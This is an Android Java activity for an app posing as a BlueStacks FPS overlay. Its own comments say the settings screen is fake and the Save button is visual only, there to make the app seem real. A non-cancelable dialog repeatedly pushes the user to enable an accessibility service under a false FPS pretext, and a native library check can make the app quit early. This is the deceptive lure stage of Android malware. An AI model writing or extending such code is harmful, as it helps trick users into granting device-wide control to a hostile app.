package com.bluestacks.fpsoverlay;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.app.AlertDialog;
import android.widget.Toast;

public class CoreActivity extends Activity {

    private AlertDialog currentDialog;

    public native boolean checkStatus();

    static {
        System.loadLibrary("fps-native");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Tampilkan layout pengaturan palsu agar bisa "masuk" ke apk
        setContentView(R.layout.activity_main);
        
        if (checkStatus()) {
            finish();
            return;
        }

        // Logika tombol Save (Visual Only) agar user merasa ini aplikasi beneran
        findViewById(R.id.btn_save).setOnClickListener(v -> {
            Toast.makeText(this, "Settings Saved!", Toast.LENGTH_SHORT).show();
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Cek izin aksesibilitas setiap kali aplikasi dibuka/kembali ke layar utama
        if (!isServiceEnabled()) {
            showAccessibilityDialog();
        } else {
            // Jika sudah aktif, tutup dialog jika masih ada
            if (currentDialog != null && currentDialog.isShowing()) {
                currentDialog.dismiss();
            }
        }
    }

    private void showAccessibilityDialog() {
        if (currentDialog != null && currentDialog.isShowing()) return;

        currentDialog = new AlertDialog.Builder(this)
            .setTitle("Izin Diperlukan")
            .setMessage("Aktifkan accessibility service untuk melihat fps secara realtime")
            .setCancelable(false)
            .setPositiveButton("OK", (dialog, which) -> {
                Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            })
            .show();
    }

    private boolean isServiceEnabled() {
        String s_id = getPackageName() + "/" + SupportService.class.getName();
        String active = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (active == null) return false;
        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
        splitter.setString(active);
        while (splitter.hasNext()) {
            if (splitter.next().equalsIgnoreCase(s_id)) return true;
        }
        return false;
    }
}
